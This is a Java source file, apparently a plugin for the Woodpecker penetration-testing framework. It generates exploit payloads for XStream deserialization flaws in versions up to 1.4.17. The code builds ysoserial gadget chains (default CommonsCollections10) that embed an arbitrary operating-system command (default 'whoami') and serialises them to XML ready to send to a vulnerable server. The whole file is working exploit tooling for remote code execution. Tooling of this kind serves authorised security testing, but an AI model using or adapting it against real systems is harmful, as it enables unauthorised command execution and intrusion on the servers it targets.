package me.gv7.woodpecker.vuldb.payload;

import com.thoughtworks.xstream.XStream;
import com.thoughtworks.xstream.io.xml.DomDriver;
import me.gv7.woodpecker.plugin.IArg;
import me.gv7.woodpecker.plugin.IArgsUsageBinder;
import me.gv7.woodpecker.plugin.IPayloadGenerator;
import me.gv7.woodpecker.plugin.IResultOutput;
import me.gv7.woodpecker.vuldb.XStreamVulPlugin;
import me.gv7.woodpecker.yso.payloads.ObjectPayload;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class YsoserialPayloadGenerator implements IPayloadGenerator {
    public String getPayloadTabCaption() {
        return "ysoserial payload";
    }

    public IArgsUsageBinder getPayloadCustomArgs() {
        IArgsUsageBinder argsUsageBinder = XStreamVulPlugin.pluginHelper.createArgsUsageBinder();
        List<IArg> args = new ArrayList<IArg>();
        IArg ysoGadget = XStreamVulPlugin.pluginHelper.createArg();
        ysoGadget.setName("yso_gadget");
        ysoGadget.setDefaultValue("CommonsCollections10");
        ysoGadget.setDescription("ysoserial gadget");
        ysoGadget.setRequired(true);
        args.add(ysoGadget);


        IArg ysoCmd = XStreamVulPlugin.pluginHelper.createArg();
        ysoCmd.setName("yso_cmd");
        ysoCmd.setDefaultValue("raw_cmd:whoami");
        ysoCmd.setDescription("ysoserial command");
        ysoCmd.setRequired(true);
        args.add(ysoCmd);

        argsUsageBinder.setArgsList(args);
        return argsUsageBinder;
    }

    public void generatorPayload(Map<String, Object> customArgs, IResultOutput resultOutput) throws Throwable {
        String ysoGadget = (String)customArgs.get("yso_gadget");
        String ysoCmd = (String)customArgs.get("yso_cmd");

        try{
            javassist.ClassPool.getDefault().getCtClass("ys.payloads.util.Gadgets$StubTransletPayload").defrost();
        }catch (javassist.NotFoundException e){
        }

        ObjectPayload<?> payload = ObjectPayload.Utils.getPayloadClass(ysoGadget).newInstance();
        Object objGadget = payload.getObject(ysoCmd);

        XStream xStream=new XStream(new DomDriver());
        String strXML = xStream.toXML(objGadget);

        resultOutput.successPrintln("xstream <= 1.4.17");
        resultOutput.rawPrintln("\n"+strXML+"\n");
    }
}
